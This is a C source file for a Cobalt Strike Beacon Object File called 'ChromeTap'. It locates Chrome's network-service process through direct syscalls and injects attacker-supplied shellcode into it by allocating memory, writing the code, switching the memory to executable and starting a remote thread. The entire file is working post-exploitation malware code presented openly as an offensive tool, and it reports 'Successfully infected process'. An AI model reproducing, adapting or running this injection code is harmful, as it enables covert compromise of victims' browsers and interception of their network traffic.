#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

#include "main.h"
#include "beacon.h"
#include "Syscalls.h"

HANDLE OpenProcessHandle(DWORD dwAccess, DWORD dwPid)
{
    NTSTATUS dwStatus;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    CLIENT_ID uPid = { 0 };
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    dwStatus = NtOpenProcess(&hProcess, dwAccess, &ObjectAttributes, &uPid);
    if (dwStatus != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "NtOpenProcess(): %d", dwStatus);
    }

    return hProcess;
}

BOOL IsNetworkProc(DWORD dwPid)
{
	PPEB pPeb;
    SIZE_T stRead;
	HANDLE hProcess;
	NTSTATUS dwStatus;
	BOOL bStatus = FALSE;
	PWSTR lpwBufferLocal;
	PROCESS_BASIC_INFORMATION BasicInfo;

	MSVCRT$memset(&BasicInfo, '\0', sizeof(BasicInfo));

    if ((hProcess = OpenProcessHandle(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, dwPid)) == INVALID_HANDLE_VALUE)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

	if ((dwStatus = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(BasicInfo), NULL)) != STATUS_SUCCESS)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "NtQueryInformationProcess(): %d", dwStatus);
		goto Cleanup;
	}

    LPVOID lpPebBuf = MSVCRT$malloc(sizeof(PEB));
	if (lpPebBuf == NULL)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "malloc 1()");
		goto Cleanup;
	}

    if (NtReadVirtualMemory(hProcess, BasicInfo.PebBaseAddress, lpPebBuf, sizeof(PEB), &stRead) != STATUS_SUCCESS)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "NtReadVirtualMemory 1()");
		goto Cleanup;
	}

    PPEB pPebLocal = (PPEB)lpPebBuf;

	PRTL_USER_PROCESS_PARAMETERS pRtlProcParam = pPebLocal->ProcessParameters;
	PRTL_USER_PROCESS_PARAMETERS pRtlProcParamCopy = (PRTL_USER_PROCESS_PARAMETERS)MSVCRT$malloc(sizeof(RTL_USER_PROCESS_PARAMETERS));

	if (pRtlProcParamCopy == NULL)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "malloc 2()");
		goto Cleanup;
	}

	if (NtReadVirtualMemory(hProcess, pRtlProcParam, pRtlProcParamCopy, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL) != STATUS_SUCCESS)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "NtReadVirtualMemory 2()");
		goto Cleanup;
	}

	USHORT len =  pRtlProcParamCopy->CommandLine.Length;
	PWSTR lpwBuffer = pRtlProcParamCopy->CommandLine.Buffer;
	
	if ((lpwBufferLocal = (PWSTR)MSVCRT$malloc(len)) == NULL)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "malloc 3()");
		goto Cleanup;
	}

	if (NtReadVirtualMemory(hProcess, lpwBuffer, lpwBufferLocal, len, NULL) != STATUS_SUCCESS)
	{
		bStatus = FALSE;

		BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory 3()");
		goto Cleanup;
	}

	if (MSVCRT$wcsstr(lpwBufferLocal, L"--utility-sub-type=network.mojom.NetworkService") != NULL)
	{
		bStatus = TRUE;
	}

	goto Cleanup;

Cleanup:
	if (hProcess) { KERNEL32$CloseHandle(hProcess); }

	return bStatus;
}

DWORD GetChromeNetworkProc()
{
    NTSTATUS dwStatus;
    ULONG ulRetLen = 0;
    LPVOID lpBuffer = NULL;
    DWORD dwPid, dwProcPid = 0;

    if (NtQuerySystemInformation(SystemProcessInformation, 0, 0, &ulRetLen) != STATUS_INFO_LENGTH_MISMATCH)
    {
        BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation() 1");
        goto Cleanup;
    }

    lpBuffer = MSVCRT$malloc(ulRetLen);
    if (lpBuffer == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "malloc() 1");
        goto Cleanup;
    }

    if (!NtQuerySystemInformation(SystemProcessInformation, lpBuffer, ulRetLen, &ulRetLen) == STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation() 1");
        goto Cleanup;
    }

    PSYSTEM_PROCESSES lpProcInfo = (PSYSTEM_PROCESSES)lpBuffer;

    do
    {
        dwPid = 0;

        lpProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)lpProcInfo) + lpProcInfo->NextEntryDelta);
        dwProcPid = *((DWORD*)&lpProcInfo->ProcessId);
        
        if (MSVCRT$wcscmp(lpProcInfo->ProcessName.Buffer, L"chrome.exe") == 0)
        {
            if (IsNetworkProc(dwProcPid))
            {
                dwPid = dwProcPid;
                goto Cleanup;
            }
        }

        if (lpProcInfo->NextEntryDelta == 0) 
        {
			goto Cleanup;
        }
    } while (lpProcInfo);

Cleanup:
	return dwPid;
}

BOOL InjectShellcode(DWORD dwChromePid, DWORD dwShcLen, LPVOID lpShcBuf)
{
    ULONG ulPerms;
	LPVOID lpBuffer = NULL;
	HANDLE hProcess, hThread;
    SIZE_T stSize = (SIZE_T)dwShcLen;

    if ((hProcess = OpenProcessHandle(PROCESS_ALL_ACCESS, dwChromePid)) == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    NtAllocateVirtualMemory(hProcess, &lpBuffer, 0, &stSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (lpBuffer == NULL)
    {
        return FALSE;
    }

    if (NtWriteVirtualMemory(hProcess, lpBuffer, lpShcBuf, dwShcLen, NULL) != STATUS_SUCCESS)
    {
        return FALSE;
    }

    if (NtProtectVirtualMemory(hProcess, &lpBuffer, &stSize, PAGE_EXECUTE_READ, &ulPerms) != STATUS_SUCCESS)
    {
        return FALSE;
    }

    NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (hThread == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

	return TRUE;
}

VOID go( 
	IN PCHAR lpcBuffer, 
	IN ULONG ulLength 
) 
{
	datap dpParse;
    LPVOID lpBuffer = NULL;
	DWORD dwBufLen, dwChromePid = 0;

	BeaconDataParse(&dpParse, lpcBuffer, ulLength);

    dwBufLen = BeaconDataInt(&dpParse);
	lpBuffer = BeaconDataExtract(&dpParse, NULL);

    if (dwBufLen == 0 || lpBuffer == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "ChromeTap: Failed to extract shellcode, have you changed the CNA?");
		goto Cleanup;
	}

	if ((dwChromePid = GetChromeNetworkProc()) == 0)
	{
		BeaconPrintf(CALLBACK_ERROR, "ChromeTap: Failed to find chrome's network service, is it running?");
		goto Cleanup;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[ChromeTap] Found service (%d)\n", dwChromePid);

	if (!InjectShellcode(dwChromePid, dwBufLen, lpBuffer))
	{
		BeaconPrintf(CALLBACK_ERROR, "ChromeTap: Failed to inject shellcode");
		goto Cleanup;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[ChromeTap] Successfully infected process\n", dwChromePid);

Cleanup:
	return;
}